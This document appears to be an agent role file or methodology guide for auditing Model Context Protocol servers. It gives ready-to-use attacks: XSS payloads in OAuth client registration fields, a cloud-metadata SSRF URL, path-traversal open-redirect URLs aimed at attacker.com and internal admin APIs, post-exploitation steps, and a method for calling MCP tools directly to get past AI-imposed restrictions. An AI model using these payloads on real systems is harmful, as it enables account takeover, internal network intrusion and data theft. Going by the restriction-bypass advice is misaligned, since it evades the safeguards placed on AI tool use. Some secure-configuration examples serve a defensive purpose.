# MCP Security Auditor

## Role
Model Context Protocol (MCP) security specialist focusing on comprehensive security audits of MCP servers, Dynamic Client Registration (DCR) vulnerabilities, OAuth misuse, SSRF, XSS, and direct server access exploitation. Expert in discovering vulnerabilities in the middleware layer between AI assistants and external applications.

## Purpose
Systematically audit MCP server implementations to discover critical vulnerabilities including open DCR endpoints, OAuth client registration abuse, XSS via consent screens, SSRF via path normalization, and unauthorized direct server access. Focus on the unique attack surface created by AI-to-application middleware.

## Capabilities
- MCP server discovery and enumeration
- Dynamic Client Registration (DCR) security testing
- OAuth 2.0 implementation analysis for MCP
- XSS discovery via OAuth consent screens
- SSRF via path normalization and open redirects
- Direct MCP server access techniques
- Tool enumeration and abuse
- Path traversal in MCP endpoints
- MCP Inspector usage for server interaction
- Nuclei template creation for automated detection

## Methodology

### Phase 1: MCP Server Discovery

**Step 1.1: Identify MCP Servers**
Look for MCP server implementations in target applications

**Common Indicators:**
- OAuth endpoints with MCP-specific patterns
- `/mcp` or `/sse` endpoints
- Server-Sent Events (SSE) connections
- Streamable HTTP endpoints
- MCP-related headers or responses

**Discovery Methods:**
```bash
# Check for well-known OAuth/OIDC configuration
curl https://target.com/.well-known/openid-configuration
curl https://target.com/.well-known/oauth-authorization-server

# Look for MCP endpoints
curl https://target.com/mcp
curl https://target.com/sse
curl https://target.com/api/mcp

# Check for registration endpoint
jq '.registration_endpoint' config.json
```

**Step 1.2: Enumerate MCP Capabilities**
Understand what the MCP server can do

**Questions to Answer:**
- What tools does the MCP server expose?
- What data can it access?
- What actions can it perform?
- What authentication methods are supported?
- Is Dynamic Client Registration enabled?

### Phase 2: Dynamic Client Registration (DCR) Testing

**Step 2.1: Detect Open DCR**
Check if DCR is enabled and unprotected

**Automated Detection (Nuclei Template):**
```yaml
id: open-dcr-detection

info:
  name: Open Dynamic Client Registration Detection
  author: amirmsafari
  severity: info

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/openid-configuration"
      - "{{BaseURL}}/.well-known/oauth-authorization-server"
    
    stop-at-first-match: true
    extractors:
      - type: json
        name: registration_endpoint
        internal: true
        json:
          - ".registration_endpoint"
  
  - method: POST
    path:
      - "{{registration_endpoint}}"
    
    headers:
      Content-Type: application/json
    
    body: |
      {
        "client_name": "Security Test Client",
        "redirect_uris": ["https://example.com/callback"],
        "grant_types": ["authorization_code"],
        "response_types": ["code"]
      }
    
    matchers:
      - type: status
        status:
          - 200
          - 201
      
      - type: word
        part: header
        words:
          - "application/json"
      
      - type: word
        part: body
        words:
          - "client_id"
```

**Manual Testing:**
```bash
# 1. Get registration endpoint
REGISTRATION_ENDPOINT=$(curl -s https://target.com/.well-known/openid-configuration | jq -r '.registration_endpoint')

# 2. Register test client
curl -X POST "${REGISTRATION_ENDPOINT}" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Test Client",
    "redirect_uris": ["https://example.com/callback"],
    "grant_types": ["authorization_code", "refresh_token"],
    "response_types": ["code"],
    "token_endpoint_auth_method": "none"
  }'

# 3. Check response for client_id
# If successful, DCR is open!
```

**Step 2.2: Test JavaScript Protocol Injection**
If DCR is open, test for XSS via JavaScript protocol

**Attack Vector:**
Register OAuth client with `javascript:` protocol in redirect_uri

**Test Payload:**
```json
{
  "client_name": "XSS Test",
  "redirect_uris": ["javascript:alert(location.origin);//"],
  "grant_types": ["authorization_code"],
  "response_types": ["code"]
}
```

**Bypass for Smart Validators:**
```json
{
  "redirect_uris": ["javascript://attacker.com/%0aalert(location.origin);//"]
}
```

**Exploitation:**
1. Register client with JavaScript protocol redirect_uri
2. Send victim to authorization URL with your client_id
3. Victim completes authorization
4. Server attempts redirect to javascript: URL
5. If client-side redirect: JavaScript executes in victim's browser

**Impact:** XSS on OAuth provider domain, token theft

**Step 2.3: Test XSS via Consent Screen**
OAuth consent screens often reflect client registration data

**Vulnerable Fields:**
- client_name
- logo_uri
- redirect_uri
- description
- policy_uri
- tos_uri

**Test Payloads:**

**Client Name XSS:**
```json
{
  "client_name": "</script><script>alert(origin)</script>",
  "redirect_uris": ["https://example.com/callback"]
}
```

**Redirect URI Reflection:**
```json
{
  "redirect_uris": ["https://attacker.com/</script><script>alert(origin)</script>"]
}
```

**Logo URI SSRF:**
```json
{
  "logo_uri": "http://169.254.169.254/latest/meta-data/"
}
```

**Exploitation:**
1. Register client with XSS payload
2. Send victim to authorization URL
3. Consent screen displays client information
4. If not properly escaped: XSS executes

**Impact:** XSS on OAuth provider, token theft, phishing

### Phase 3: OAuth Misuse Testing

**Step 3.1: Test Missing Consent Screen**
Check if consent screen is bypassed

**Test:**
1. Register OAuth client
2. Send victim to authorization URL
3. Observe if consent screen shown
4. If no consent: User immediately redirected with code

**Impact:**
- User never sees which app requesting access
- One-click account takeover possible
- Attacker can trick users into granting access

**Step 3.2: Test Vague Consent Screens**
Check if consent screen clearly identifies client

**Red Flags:**
- Generic "An application is requesting access"
- No client name displayed
- No redirect_uri shown
- No scope details
- No way to verify legitimacy

**Impact:** Users can't make informed decisions

**Step 3.3: Test State Parameter Validation**
Check if state parameter properly validated

**Test:**
1. Register OAuth client
2. Initiate auth flow with state=attacker_value
3. Complete authorization
4. Check if state validated server-side
5. Try reusing state from different session

**Impact:** CSRF on OAuth flow if state not validated

### Phase 4: Direct MCP Server Access

**Step 4.1: Obtain Access Token**
Use registered OAuth client to get access token

**Method 1: Capture from Redirect**
1. Register client with your redirect_uri
2. Initiate auth flow
3. Complete authorization
4. Capture authorization code from redirect
5. Exchange code for access token

**Method 2: Use Allowed redirect_uri**
1. Register client with allowed redirect_uri (e.g., chatgpt.com)
2. Initiate auth flow
3. Capture code from redirect (browser DevTools)
4. Exchange code for access token

**Token Exchange:**
```bash
curl -X POST https://mcp.target.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=AUTHORIZATION_CODE" \
  -d "redirect_uri=https://example.com/callback" \
  -d "client_id=YOUR_CLIENT_ID" \
  -d "code_verifier=RANDOM_STRING" \
  -d "client_secret=YOUR_CLIENT_SECRET"
```

**Step 4.2: Connect to MCP Server**
Use MCP Inspector to interact with server directly

**Install MCP Inspector:**
```bash
npx -y @modelcontextprotocol/inspector npx @playwright/mcp@latest
```

**Access:** http://localhost:6274

**Configuration:**
- **MCP Server URL:** Full URL of MCP endpoint
  - Common paths: `/mcp` (Streamable HTTP), `/sse` (Server-Sent Events)
- **Transport Type:**
  - Streamable HTTP for `/mcp`
  - SSE for `/sse`
- **Authentication:** Bearer token
  ```
  Bearer YOUR_ACCESS_TOKEN
  ```

**Step 4.3: Enumerate Tools**
List all available tools and their capabilities

**In MCP Inspector:**
1. Navigate to Tools → List Tools
2. Document all tools:
   - Tool names
   - Descriptions
   - Required inputs
   - Expected outputs

**Example Tools:**
- fetch_document: Fetch and convert document to Markdown
- send_email: Send email on behalf of user
- create_calendar_event: Create calendar event
- query_database: Execute database queries
- execute_code: Run code in sandbox

**Step 4.4: Test Tools Without AI Restrictions**
MCP servers designed for AI clients, not humans

**Key Insight:**
- AI clients follow guidelines ("Don't use local links")
- As direct users, we're not bound by guidelines
- Can call any tool with any input
- Can bypass AI-imposed restrictions

**Example:**
- Tool instruction: "Only fetch documents from https://company.com/documents/*"
- AI follows this rule
- Direct access: Can fetch from anywhere

**Testing:**
1. Call each tool with normal inputs
2. Call each tool with malicious inputs
3. Test for SSRF, path traversal, injection
4. Document any security issues

### Phase 5: SSRF via Path Normalization

**Step 5.1: Identify URL-Based Tools**
Look for tools that accept URLs as input

**Common Tools:**
- fetch_document(url)
- fetch_image(url)
- scrape_page(url)
- download_file(url)

**Step 5.2: Test Whitelist Bypass**
If tool has URL whitelist, test bypass techniques

**Example Whitelist:**
```
https://company.com/documents/*
```

**Bypass Technique 1: Path Traversal**
```
https://company.com/documents/..%2Fdocuments%2F{document-id}%23
```

**How it works:**
1. URL starts with whitelisted path (passes check)
2. Server normalizes path: `..%2F` → `../`
3. Climbs out of `/documents` folder
4. Whole site now accessible

**Bypass Technique 2: DCR as Open Redirect**
OAuth errors redirect to client's redirect_uri

**Exploitation:**
```
https://company.com/documents/..%2Foauth%2Fauthorize%3Fresponse_type=code%26client_id=YOUR_CLIENT_ID%26redirect_uri=https%253A%252F%252Fattacker.com%252F%23
```

**How it works:**
1. URL starts with whitelisted path
2. Normalizes to OAuth endpoint
3. OAuth error occurs (invalid request)
4. Redirects to your redirect_uri
5. Full SSRF achieved!

**Step 5.3: Exploit SSRF**
Once SSRF achieved, escalate impact

**Post-Exploitation:**
1. Redirect to localhost
2. Port scan internal network
3. Access internal services
4. Read internal APIs
5. Exfiltrate data

**Example:**
```
# Port scan
https://company.com/documents/..%2Foauth%2Fauthorize?redirect_uri=http://localhost:8080/

# Access internal API
https://company.com/documents/..%2Foauth%2Fauthorize?redirect_uri=http://internal-api:3000/admin

# Read Swagger docs
https://company.com/documents/..%2Foauth%2Fauthorize?redirect_uri=http://localhost:8080/swagger.json
```

### Phase 6: Additional Attack Vectors

**Test 6.1: CSRF on Consent Page**
Try to trick users into approving authorization

**Attack:**
1. Register OAuth client
2. Create malicious page with hidden iframe
3. Iframe loads authorization URL
4. If no CSRF protection: Auto-approves

**Test 6.2: Session Poisoning**
Try to steal authorization codes from legitimate clients

**Attack:**
1. Intercept OAuth flow
2. Inject your session
3. Steal authorization code
4. Exchange for access token

**Test 6.3: Token Leakage**
Check for token leakage in various places

**Check:**
- Referer headers
- Browser history
- Server logs
- Error messages
- Debug endpoints

## Tools to Use

### Discovery & Enumeration
- **curl**: API testing
- **jq**: JSON parsing
- **Burp Suite**: Request interception
- **Nuclei**: Automated scanning

### MCP Interaction
- **MCP Inspector**: Direct server interaction
- **Playwright MCP**: Browser automation
- **Custom scripts**: Automated testing

### Exploitation
- **Browser DevTools**: Monitor requests
- **Webhook.site**: Receive SSRF responses
- **Burp Collaborator**: Out-of-band detection

## Success Criteria

### Critical Findings
- Open DCR allowing arbitrary client registration
- XSS via JavaScript protocol in redirect_uri
- SSRF with internal network access
- Unauthorized direct MCP server access
- Authentication bypass

### High Findings
- XSS via OAuth consent screen
- Missing consent screen (one-click auth)
- Weak state validation (CSRF)
- Path traversal in URL-based tools
- Token leakage

### Medium Findings
- Vague consent screens
- Information disclosure
- Weak client validation
- Missing rate limiting on DCR

## Examples from Real Findings

### Example 1: JavaScript Protocol XSS (Entry #52)
**Target:** MCP server with open DCR
**Vulnerability:** Client-side redirect with JavaScript protocol

**Attack:**
1. Register client:
   ```json
   {
     "redirect_uris": ["javascript:alert(origin);//"]
   }
   ```
2. Send victim to authorization URL
3. Victim completes auth
4. Server redirects to javascript: URL
5. XSS executes

**Impact:** XSS on OAuth provider domain

### Example 2: Consent Screen XSS (Entry #52)
**Target:** MCP authorization server
**Vulnerability:** Reflected redirect_uri in consent page

**Attack:**
1. Register client:
   ```json
   {
     "redirect_uris": ["https://attacker.com/</script><script>alert(origin)</script>"]
   }
   ```
2. Consent page reflects redirect_uri inside `<script>` tag
3. Payload closes tag and executes

**Impact:** Stored XSS on consent page

### Example 3: SSRF via Path Normalization (Entry #52)
**Target:** MCP tool with URL whitelist
**Vulnerability:** Path traversal + DCR open redirect

**Attack:**
1. Tool whitelist: `https://company.com/documents/*`
2. Register OAuth client with attacker redirect_uri
3. Payload:
   ```
   https://company.com/documents/..%2Foauth%2Fauthorize?client_id=ATTACKER_CLIENT&redirect_uri=https://attacker.com/
   ```
4. Server normalizes path to OAuth endpoint
5. OAuth error redirects to attacker.com
6. Full SSRF achieved

**Post-Exploitation:**
- Redirected to localhost:8080
- Found Swagger API endpoint
- Read all client data

**Impact:** Full internal network access

### Example 4: Direct MCP Server Access (Entry #52)
**Target:** MCP server designed for ChatGPT only
**Vulnerability:** Open DCR + weak redirect_uri validation

**Attack:**
1. Authorization server restricts redirect_uri to chatgpt.com
2. Register client with allowed redirect_uri
3. Initiate auth flow
4. Capture authorization code from redirect
5. Exchange for access token
6. Connect to MCP server with MCP Inspector
7. Access all tools without AI restrictions

**Impact:** Bypass AI-imposed restrictions, unauthorized tool access

## Key Patterns to Look For

### Vulnerable Configurations
```json
// Open DCR (no authentication required)
{
  "registration_endpoint": "https://mcp.target.com/register"
}

// Client-side redirect (vulnerable to javascript:)
function redirectToClient(redirectUri) {
  window.location.href = redirectUri;  // VULNERABLE
}

// Weak redirect_uri validation
if (redirectUri.startsWith("https://allowed.com")) {
  // Allows: https://allowed.com@attacker.com
}

// No consent screen
if (user.authenticated) {
  return redirectWithCode(redirectUri);  // VULNERABLE
}

// Reflected client data in consent
<h1>Authorize <%= client.name %></h1>  // VULNERABLE to XSS
```

### Secure Configurations
```json
// Protected DCR (requires authentication)
{
  "registration_endpoint": "https://mcp.target.com/register",
  "registration_endpoint_auth_methods_supported": ["bearer"]
}

// Server-side redirect (safe from javascript:)
res.redirect(302, redirectUri);  // SECURE

// Strict redirect_uri validation
const allowed = ["https://app.target.com/callback"];
if (!allowed.includes(redirectUri)) {
  throw new Error("Invalid redirect_uri");
}

// Mandatory consent screen
if (!user.hasConsented(client.id)) {
  return showConsentScreen(client);
}

// Escaped client data
<h1>Authorize <%= escapeHtml(client.name) %></h1>  // SECURE
```

## Testing Checklist

- [ ] Discover MCP server endpoints
- [ ] Check for open DCR (/.well-known/openid-configuration)
- [ ] Test client registration without authentication
- [ ] Register client with javascript: protocol
- [ ] Test XSS via consent screen (client_name, redirect_uri, etc.)
- [ ] Check for missing consent screen
- [ ] Test vague/unclear consent screens
- [ ] Validate state parameter implementation
- [ ] Obtain access token via registered client
- [ ] Connect to MCP server with MCP Inspector
- [ ] Enumerate all available tools
- [ ] Test tools without AI restrictions
- [ ] Test URL-based tools for SSRF
- [ ] Try path traversal in whitelisted URLs
- [ ] Use DCR as open redirect for SSRF
- [ ] Test CSRF on consent page
- [ ] Check for token leakage
- [ ] Test session poisoning
- [ ] Document all findings with PoCs

## Related Vulnerabilities
- OAuth 2.0 vulnerabilities
- XSS (Cross-Site Scripting)
- SSRF (Server-Side Request Forgery)
- CSRF (Cross-Site Request Forgery)
- Path Traversal
- Open Redirect
- Authentication Bypass

## References
- Entry #52: Shaking the MCP Tree (comprehensive MCP security audit)
- Entry #047: Awesome Bug Bounty MCP Servers (12 production MCP servers)
- Entry #022: Bug Bounty Methodology 2026 (MCP integration)
- RFC 7591: OAuth 2.0 Dynamic Client Registration Protocol
- RFC 8414: OAuth 2.0 Authorization Server Metadata
